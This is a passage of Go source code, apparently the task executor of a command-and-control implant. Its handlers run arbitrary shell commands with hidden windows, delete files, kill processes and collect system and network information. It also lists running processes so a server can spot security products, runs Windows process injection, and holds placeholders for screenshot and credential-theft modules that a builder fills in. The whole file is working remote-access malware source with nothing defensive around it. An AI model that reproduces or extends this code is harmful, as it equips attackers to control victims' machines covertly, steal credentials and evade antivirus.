	if err := os.RemoveAll(filePath); err != nil {
		return "", -1, err.Error()
	}

	return fmt.Sprintf("File deleted: %s", filePath), 0, ""
}

// ─── Process Operations ──────────────────────────────────────────────────────────

// handleProcessKill kills a process by PID
func handleProcessKill(task protocol.Task) (string, int32, string) {
	if task.PID == 0 {
		return "", -1, "no PID provided"
	}

	if runtime.GOOS != "windows" {
		// Unix-like: use syscall.Kill
		process, err := os.FindProcess(int(task.PID))
		if err != nil {
			return "", -1, err.Error()
		}
		if err := process.Signal(syscall.SIGKILL); err != nil {
			return "", -1, err.Error()
		}
		return fmt.Sprintf("Process %d killed", task.PID), 0, ""
	}

	// Windows: use taskkill
	cmd := exec.Command("taskkill", "/F", "/PID", fmt.Sprintf("%d", task.PID))
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), -1, err.Error()
	}
	return string(out), 0, ""
}

// ─── Shell Execution ─────────────────────────────────────────────────────────────

// handleShell executes a shell command
func handleShell(task protocol.Task) (string, int32, string) {
	command := task.Command
	if command == "" && task.Data != "" {
		// Try to parse Data as JSON to extract "command" field
		var shellData struct {
			Command string `json:"command"`
			Args    string `json:"args"`
		}
		if err := json.Unmarshal([]byte(task.Data), &shellData); err == nil && shellData.Command != "" {
			command = shellData.Command
			if shellData.Args != "" {
				command += " " + shellData.Args
			}
		} else {
			// Fallback: treat Data as raw command string
			command = task.Data
		}
	}
	if command == "" {
		return "", -1, "no command provided"
	}

	fmt.Printf("[DEBUG] [implant] Executing shell: %s\n", command)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	cmd.Dir = os.Getenv("USERPROFILE")

	out, err := cmd.CombinedOutput()
	if err != nil {
		code := int32(-1)
		if ee, ok := err.(*exec.ExitError); ok {
			code = int32(ee.ExitCode())
		}
		return string(out), code, err.Error()
	}
	return string(out), 0, ""
}

// ─── Screenshot ──────────────────────────────────────────────────────────────────

// handleScreenshot captures a screenshot using GDI32
func handleScreenshot(task protocol.Task) (string, int32, string) {
	if runtime.GOOS != "windows" {
		return "Screenshot only supported on Windows", -1, "unsupported platform"
	}
	return captureScreenshotWindows()
}

// ─── Credentials ─────────────────────────────────────────────────────────────────

// handleCredentials gathers credentials from various sources
func handleCredentials(task protocol.Task) (string, int32, string) {
	if runtime.GOOS != "windows" {
		return "Credentials gathering only supported on Windows", -1, "unsupported platform"
	}
	return gatherCredentialsWindows()
}

// handleSysinfo gathers system information
func handleSysinfo() (string, int32, string) {
	info, err := sysinfo.Gather()
	if err != nil {
		return "", -1, fmt.Sprintf("Failed to gather sysinfo: %v", err)
	}
	data, _ := json.MarshalIndent(info, "", "  ")
	return string(data), 0, ""
}

// handleNetstat gathers network connections
func handleNetstat() (string, int32, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", "netstat -ano")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("/bin/sh", "-c", "netstat -tulnp 2>/dev/null || netstat -an")
	}
	cmd.Dir = os.Getenv("USERPROFILE")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), -1, err.Error()
	}
	return string(out), 0, ""
}

// detectSecurityProductsWS enumerates running processes and reports the raw process name list.
// The security product fingerprint matching is performed server-side (data/av_fingerprints.json),
// so the implant no longer carries the signature library and can shrink its binary size.
func detectSecurityProductsWS() (string, int32, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist", "/fo", "csv", "/nh")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("/bin/sh", "-c", "ps -eo comm --no-headers")
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, err.Error()
	}

	// Windows下 tasklist 输出为 GBK，先转为 UTF-8
	processList := string(out)
	if runtime.GOOS == "windows" {
		processList = gbkToUTF8(processList)
	}

	// 提取去重后的进程名列表（JSON 数组），交由服务端指纹库匹配
	seen := make(map[string]bool)
	var names []string
	for _, line := range strings.Split(processList, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// 提取进程名：Windows CSV 为 "进程名",PID,...  Linux ps 为第一列
		procName := line
		if runtime.GOOS == "windows" {
			if strings.HasPrefix(line, "\"") {
				parts := strings.SplitN(line, "\",", 2)
				procName = strings.Trim(parts[0], "\"")
			}
		} else {
			fields := strings.Fields(line)
			if len(fields) > 0 {
				procName = fields[0]
			}
		}
		if procName == "" || seen[procName] {
			continue
		}
		seen[procName] = true
		names = append(names, procName)
	}

	data, _ := json.Marshal(names)
	return string(data), 0, ""
}

// handleInjectionCommand handles unified injection tasks (TaskTypeInjection = "injection")
func handleInjectionCommand(task protocol.Task) (string, int32, string) {
	if runtime.GOOS != "windows" {
		return "Injection is only supported on Windows", -1, "Unsupported platform"
	}

	// task.Command or task.Data contains the injection command JSON
	cmdJSON := task.Data
	if cmdJSON == "" {
		cmdJSON = task.Command
	}
	if cmdJSON == "" {
		return "No injection command data provided", -1, "Missing command data"
	}

	result, err := injection.ExecuteCommandStruct(func() *injection.Command {
		var cmd injection.Command
		if e := json.Unmarshal([]byte(cmdJSON), &cmd); e != nil {
			return nil
		}
		return &cmd
	}())
	if err != nil {
		fmt.Printf("[executor] Injection command failed: %v\n", err)
		return fmt.Sprintf("❌ Injection failed: %v", err), -1, err.Error()
	}
	if result == nil {
		return "❌ Injection failed: invalid command JSON", -1, "Invalid command JSON"
	}

	if !result.Success {
		fmt.Printf("[executor] Injection returned failure: %s\n", result.Error)
		return fmt.Sprintf("❌ Injection failed: %s", result.Error), -1, result.Error
	}

	output := "✅ Injection successful!\n"
	if result.ProcessID != 0 {
		output += fmt.Sprintf("Process ID: %d\n", result.ProcessID)
	}
	if result.ThreadID != 0 {
		output += fmt.Sprintf("Thread ID: %d\n", result.ThreadID)
	}
	if result.Message != "" {
		output += result.Message
	}

	fmt.Printf("[executor] Injection command completed successfully\n")
	return output, 0, ""
}

// ─── Screenshot & Credentials Stubs ──────────────────────────────────────────────
// These are replaced by the builder with real implementations (screenshot_windows.go,
// credentials_windows.go) when building implants.

func captureScreenshotWindows() (string, int32, string) {
	return "Screenshot module not included in this implant build", -1, "not implemented"
}

func gatherCredentialsWindows() (string, int32, string) {
	return "Credentials module not included in this implant build", -1, "not implemented"
}